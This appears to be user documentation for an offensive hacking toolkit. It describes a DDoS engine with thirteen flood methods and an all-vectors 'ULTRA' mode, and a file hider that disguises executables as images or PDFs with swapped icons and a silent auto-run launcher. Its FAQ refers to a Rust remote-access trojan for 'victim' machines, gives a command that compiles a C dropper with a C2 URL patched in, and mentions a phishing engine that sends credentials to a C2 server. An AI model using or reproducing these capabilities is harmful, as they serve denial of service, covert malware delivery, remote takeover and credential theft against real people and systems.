02 Navigation

The UI is a violet animated arrow-key menu. On first launch a matrix-style animation plays, then the menu appears. The layout adapts automatically to terminal width — on narrow terminals it wraps into multiple rows instead of one long line.

KeyAction
↑ ↓Move up / down in column
← →Switch column
EnterLaunch selected module
MOpen text menu (fallback for non-TTY, Termux)
QQuit
W S A DWASD navigation (alternative to arrows)

Arrow keys use os.read(fd, 1) directly (not Python's buffered stdin.read()) to avoid input blocking on Linux/Termux. On Windows, msvcrt.getch() is used instead. Falls back gracefully to text menu if TTY is not available.

04 DDoS Engine

Port is auto-detected from the URL — no need to enter it manually. https:// → 443, http:// → 80, explicit port in URL is preserved. For L4 methods (UDP, SYN, Slowloris, SSL) a prompt shows the detected port and lets you override.

KeyMethodLayerHow it works
1UDP FloodL41024-byte random UDP datagrams to target:port
2TCP SYN FloodL4Half-open TCP connections, exhausts connection table
3HTTP GET FloodL7High-RPS GET requests, random User-Agent
4SlowlorisL7Keeps sockets open with partial headers, drains worker pool
5HTTP POST FloodL7Large form POST bodies, exhausts app/DB parsers
6R.U.D.YL7POST body sent 1 byte per ~12s, ties up worker threads indefinitely
7DNS AmplificationL7Floods recursive DNS resolvers with ANY queries
8ICMP FloodL3Ping with 1400-byte payload via subprocess
9SSL RenegotiationL7Repeated TLS handshakes to exhaust server CPU
BHULKL7Random GET with unique query strings — bypasses cache entirely
CGET Flood AutoL7Timed flood with HTTP connection pooling (100 keep-alive connections)
DPOST Flood AutoL7Timed POST flood with random JSON payloads, connection pooling
⚡ EULTRA — all 11ALLLaunches all 11 vectors simultaneously at max threads. 50 threads per vector minimum (or cpu_count × 8). Live pkt/s counter.

Mode A — combined (9 vectors)

Threads are split equally between 9 vectors. Use ULTRA E instead for maximum power — it uses 50+ threads per vector regardless.

07 File Hider

Hides any file inside any carrier using a magic marker appended to the end of the carrier. The output file opens normally as the carrier type — a JPG opens as an image, a PDF opens in a PDF reader. Extraction finds the marker from the end of the file.

OptionDescription
[1] HideEmbed any payload (.exe .py .sh .zip...) inside any carrier (image · PDF · MP4 · ZIP...)
[2] ExtractRecover hidden payload. Validates size against stored header.
[3] ScanDetect hidden payload — reports name, size, and byte offset.
[4] IconChange .exe icon from .ico or .png/.jpg. Auto-converts image to multi-size .ico (16/32/48/64/128/256px). Uses pywin32 or Resource Hacker fallback.
[5] LauncherGenerate a .py that auto-extracts and runs the payload silently. Optionally keeps or deletes after execution.

The tool validates all paths before proceeding — if the file doesn't exist it re-prompts instead of crashing.

10 FAQ

Arrow keys don't work on Termux

Press M to switch to the text menu. The arrow-key UI requires a real TTY — Termux may not provide one if the script is launched from a non-interactive context. The text menu has full feature parity. Alternatively, use WASD keys as arrows.

How to get an OpenRouter key

Go to openrouter.ai/keys, create a free account, generate a key. Paste it on first launch of the AI Chatbot module. It's saved locally and not transmitted anywhere except OpenRouter's API.

Rust RAT — does it need Python on the victim machine?

No. The Rust RAT compiles to a standalone native binary with zero dependencies. A Windows .exe works on any Windows 7/8/10/11 x64 machine. A Linux binary works on any x64 Linux. Nothing to install on the victim side.

How to compile the C dropper on Linux

sudo apt install mingw-w64
x86_64-w64-mingw32-gcc rat/dropper.c -o dropper.exe \
  -lwinhttp -lws2_32 -lgdi32 -lole32 -luuid -mwindows -O2

Or use rat/builder.py → [2] C which patches the C2 URL into the source and compiles automatically.

Scapy / impacket not installing on Termux

Use requirements-termux.txt which excludes them. Scapy requires raw sockets (root + kernel support not available on Android). The tool detects missing modules at runtime and skips those features gracefully.

The phishing page says "invalid webhook"

The phishing engine no longer uses Discord webhooks — it uses the built-in C2 server (rat/c2/server.py) or just saves credentials locally. No webhook URL needed.
